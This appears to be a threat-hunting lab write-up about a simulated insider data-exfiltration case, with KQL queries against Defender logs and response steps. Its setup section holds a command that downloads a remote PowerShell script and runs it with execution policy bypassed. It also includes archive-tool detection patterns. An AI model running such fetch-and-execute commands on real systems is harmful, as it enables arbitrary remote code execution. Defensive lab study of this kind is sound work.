# üõ°Ô∏è Threat Hunting: Data Exfiltration by PIPd Employee (Simulated)

## üìÅ Overview
This project documents the threat hunting investigation of a simulated data exfiltration attempt using Microsoft Defender for Endpoint (MDE), PowerShell, and KQL queries. The incident was initiated by executing a malicious PowerShell script that created and zipped employee data.

---

## üí£ Initial Setup: Simulated Attack
To generate logs for hunting, a PowerShell script named `exfiltratedata.ps1` was executed in a Windows VM (labuser).

Script executed:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```
![Malicious Code that was I runned before doing the threat hunt](https://github.com/user-attachments/assets/534ba0a4-90f5-429b-8b6a-95c464a58789)


### What the Malicious Script Does:
- Creates fake employee data (names, SSNs, salaries)
- Saves the data to a CSV file
- Compresses the file into a ZIP using 7-Zip
- Logs the actions to a file: `C:\ProgramData\entropygorilla.log`

---

## üö© Scenario Summary
- A disgruntled employee, John Doe, suspected of data theft after being placed on a PIP
- Script silently downloaded and archived fake employee data
- Analysis revealed archive and PowerShell activity using `7z.exe`

---

## üß™ Steps Performed

### 1. Preparation
- Hypothesis: John may compress and exfiltrate sensitive data
- Reason: Admin privileges, performance concerns, behavioral red flags

### 2. Data Collection
Queried logs in MDE:
I did a search within MDE DeviceFileEvents for any activities with zip files, and found a suspicious activity involving a file named 7.zip created at Jun 16, 2025 12:26:25 AM and confirmed `7z.exe` used around the same timestamp a ZIP file was created:
```kql
DeviceFileEvents
| where DeviceName == "labuser"
| where FileName endswith ".zip"
| order by Timestamp desc
```

### 3. Data Analysis
I took one of the instances of a zip file being created, took the timestamp and searched under DeviceProcessEvents for any Look for any kind of archive activity that included the 7-zip file. I discovered around the same time, a powershell script silently installed 7zip and then used 7zip to zip up employee data into an archive who‚Äôs Device Name is michealvm
Queried logs in MDE:
```kql
let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe"]);
let VMName = "labuser";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
```

### 4. Investigation
Located execution of PowerShell and download activity:

Confirmed script downloaded and executed `exfiltratedata.ps1` silently.

# End logging
Log-Message "Script execution completed successfully."
### 5. Response
Steps taken:
- ‚úÖ Isolated the endpoint via Microsoft Defender
- ‚úÖ Alerted management of potential data archiving
- ‚úÖ Verified no outbound exfiltration occurred during test

### 6. Documentation
Documented full investigation, timestamps, KQL queries, and matching MITRE techniques. All screenshots and findings are included in this repository.
Notes I took for documentation of steps:

### 7. Improvement
- üîê Improve PowerShell script logging
- üì¶ Alert on archive creation by unexpected processes
- üëÆ‚Äç‚ôÇÔ∏è Limit admin rights for non-IT staff
- üß† Include 7-Zip and other archivers in threat detection rules
